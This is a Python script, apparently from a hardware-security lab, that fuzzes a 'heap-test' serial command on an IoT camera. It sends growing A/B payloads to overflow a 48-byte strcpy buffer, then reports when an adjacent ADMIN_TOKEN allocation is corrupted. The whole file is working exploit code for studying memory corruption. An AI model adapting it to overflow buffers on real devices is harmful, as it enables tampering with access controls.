#!/usr/bin/env python3
"""
Heap Buffer Overflow Exploit Tool

Sends heap overflow payloads to the CoreS3 IoT camera via the serial "heap-test"
command. The device allocates a 48-byte heap buffer and copies user input with
strcpy() (no bounds checking). A second adjacent 32-byte allocation contains
"ADMIN_TOKEN=denied". Overflowing the first buffer corrupts the second.

This tool:
  - Tests boundary conditions with increasing payload sizes
  - Parses serial output to detect corruption of the adjacent buffer
  - Displays a summary of which sizes triggered overflow detection

Usage examples:

  # Test default range (48 to 72 bytes, step 4)
  ./heap_overflow.py

  # Test with custom range
  ./heap_overflow.py --min-size 40 --max-size 80 --step 2

  # Use a different serial port
  ./heap_overflow.py --port /dev/ttyACM1 --baud 115200

  # Test a single specific size
  ./heap_overflow.py --min-size 60 --max-size 60
"""

import argparse
import sys
import time

try:
    import serial
    HAS_SERIAL = True
except ImportError:
    HAS_SERIAL = False


DEFAULT_PORT = "/dev/ttyACM0"
DEFAULT_BAUD = 115200
DEFAULT_MIN = 44
DEFAULT_MAX = 72
DEFAULT_STEP = 4

# The heap buffer is 48 bytes. Heap metadata is typically 8-16 bytes.
# Adjacent buffer starts around offset 56-64 from the start of heapBuf.
HEAP_BUF_SIZE = 48


def send_serial_command(ser, command, timeout=3.0):
    """Send a command over serial and collect the response."""
    # Flush any pending input
    ser.reset_input_buffer()

    # Send the command
    ser.write((command + "\r\n").encode("utf-8"))
    ser.flush()

    # Collect response
    output = ""
    end_time = time.time() + timeout
    while time.time() < end_time:
        data = ser.read(1024)
        if data:
            output += data.decode("utf-8", errors="replace")
            # Check if we got the full response (prompt returned)
            if "cores3-cam>" in output and output.count("cores3-cam>") >= 2:
                break
        else:
            # Small sleep to avoid busy-waiting
            time.sleep(0.05)

    return output


def parse_heap_response(output):
    """Parse the serial output from a heap-test command."""
    result = {
        "input_length": None,
        "buffer_contents": None,
        "adjacent_buffer": None,
        "overflow_status": None,
        "exceeded_by": None,
        "raw": output,
    }

    for line in output.splitlines():
        line = line.strip()

        if "Input length:" in line:
            try:
                result["input_length"] = int(line.split(":")[1].strip().split()[0])
            except (ValueError, IndexError):
                pass

        if "Buffer contents:" in line:
            result["buffer_contents"] = line.split(":", 1)[1].strip()

        if "Adjacent buffer:" in line:
            result["adjacent_buffer"] = line.split(":", 1)[1].strip()

        if "heap_overflow:" in line:
            result["overflow_status"] = line.split(":")[1].strip()

        if "exceeded buffer by" in line.lower() or "Input exceeded buffer by" in line:
            try:
                # Extract the number of bytes exceeded
                for part in line.split():
                    try:
                        result["exceeded_by"] = int(part)
                        break
                    except ValueError:
                        continue
            except (ValueError, IndexError):
                pass

    return result


def generate_payload(size, fill_char="A", marker_char="B"):
    """Generate a test payload of the given size.

    Uses fill_char for the main buffer portion and marker_char for the
    overflow portion, making it easy to see where corruption starts.
    """
    if size <= HEAP_BUF_SIZE:
        return fill_char * size
    else:
        # Fill the buffer with A's, overflow region with B's
        return fill_char * HEAP_BUF_SIZE + marker_char * (size - HEAP_BUF_SIZE)


def main():
    parser = argparse.ArgumentParser(
        description="Heap buffer overflow exploit tool for serial 'heap-test' command.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s
  %(prog)s --min-size 40 --max-size 80 --step 2
  %(prog)s --port /dev/ttyACM1
  %(prog)s --min-size 60 --max-size 60

The device allocates a 48-byte heap buffer and copies input via strcpy().
An adjacent 32-byte allocation holds "ADMIN_TOKEN=denied".
Inputs longer than 48 bytes overflow into heap metadata and then into
the adjacent allocation, corrupting the admin token.
""",
    )

    parser.add_argument(
        "--port",
        default=DEFAULT_PORT,
        help="Serial port (default: %s)" % DEFAULT_PORT,
    )
    parser.add_argument(
        "--baud",
        type=int,
        default=DEFAULT_BAUD,
        help="Baud rate (default: %d)" % DEFAULT_BAUD,
    )
    parser.add_argument(
        "--min-size",
        type=int,
        default=DEFAULT_MIN,
        help="Minimum payload size in bytes (default: %d)" % DEFAULT_MIN,
    )
    parser.add_argument(
        "--max-size",
        type=int,
        default=DEFAULT_MAX,
        help="Maximum payload size in bytes (default: %d)" % DEFAULT_MAX,
    )
    parser.add_argument(
        "--step",
        type=int,
        default=DEFAULT_STEP,
        help="Step size between payloads (default: %d)" % DEFAULT_STEP,
    )

    args = parser.parse_args()

    if not HAS_SERIAL:
        print("[ERROR] pyserial is required. Install with: pip install pyserial")
        sys.exit(1)

    print("[*] Heap Buffer Overflow Exploit Tool")
    print("=" * 55)
    print()
    print("[*] Serial port:   %s" % args.port)
    print("[*] Baud rate:     %d" % args.baud)
    print("[*] Heap buf size: %d bytes" % HEAP_BUF_SIZE)
    print("[*] Test range:    %d to %d bytes (step %d)" % (args.min_size, args.max_size, args.step))
    print()

    # Connect to serial
    try:
        ser = serial.Serial(args.port, args.baud, timeout=0.5)
        print("[*] Connected to %s" % args.port)
    except serial.SerialException as e:
        print("[ERROR] Failed to open serial port: %s" % e)
        print("[*] Is the device connected? Check with: ls -la %s" % args.port)
        sys.exit(1)

    # Flush initial data
    time.sleep(0.5)
    ser.reset_input_buffer()

    # Send an empty command to get a fresh prompt
    send_serial_command(ser, "", timeout=1.0)

    # Run tests
    results = []
    test_sizes = list(range(args.min_size, args.max_size + 1, args.step))

    # Ensure we always test the exact boundary
    if HEAP_BUF_SIZE not in test_sizes and args.min_size <= HEAP_BUF_SIZE <= args.max_size:
        test_sizes.append(HEAP_BUF_SIZE)
        test_sizes.sort()

    print("[*] Running %d test cases..." % len(test_sizes))
    print("-" * 70)
    print("  %-6s  %-10s  %-28s  %s" % ("Size", "Status", "Adjacent Buffer", "Exceeded"))
    print("-" * 70)

    for size in test_sizes:
        payload = generate_payload(size)
        command = "heap-test %s" % payload

        output = send_serial_command(ser, command, timeout=3.0)
        result = parse_heap_response(output)
        result["test_size"] = size
        results.append(result)

        status = result["overflow_status"] or "unknown"
        adjacent = result["adjacent_buffer"] or "n/a"
        if len(adjacent) > 28:
            adjacent = adjacent[:25] + "..."
        exceeded = "%d bytes" % result["exceeded_by"] if result["exceeded_by"] else "-"

        print("  %-6d  %-10s  %-28s  %s" % (size, status, adjacent, exceeded))

        # Brief pause between tests to let the device recover
        time.sleep(0.3)

    print("-" * 70)
    print()

    # Summary
    safe_count = sum(1 for r in results if r["overflow_status"] == "safe")
    detected_count = sum(1 for r in results if r["overflow_status"] == "detected")
    corrupted = [r for r in results if r["adjacent_buffer"] and
                 "ADMIN_TOKEN" not in r["adjacent_buffer"] and
                 r["adjacent_buffer"] != "n/a"]

    print("[SUMMARY]")
    print("  Safe results:     %d" % safe_count)
    print("  Overflow detected: %d" % detected_count)
    print("  Adjacent buffer corrupted: %d" % len(corrupted))
    print()

    if corrupted:
        print("[+] Adjacent buffer was corrupted at the following sizes:")
        for r in corrupted:
            print("    %d bytes -> adjacent buffer: %s" % (r["test_size"], r["adjacent_buffer"]))
        print()
        print("[+] The heap overflow successfully overwrites the adjacent ADMIN_TOKEN allocation.")
        print("[*] Minimum corruption size: %d bytes" % min(r["test_size"] for r in corrupted))
        overflow_offset = min(r["test_size"] for r in corrupted) - HEAP_BUF_SIZE
        print("[*] Estimated heap metadata size: ~%d bytes" % overflow_offset)
    else:
        if detected_count > 0:
            print("[*] Overflow was detected but adjacent buffer contents were not captured.")
            print("[*] Try increasing --max-size to overflow further into the adjacent allocation.")
        else:
            print("[-] No overflow detected. The input may not be reaching the vulnerable code path.")
            print("[*] Verify the 'heap-test' command is available (requires DEV_TEST_HOOKS build).")

    ser.close()
    print()
    print("[*] Serial connection closed.")


if __name__ == "__main__":
    main()
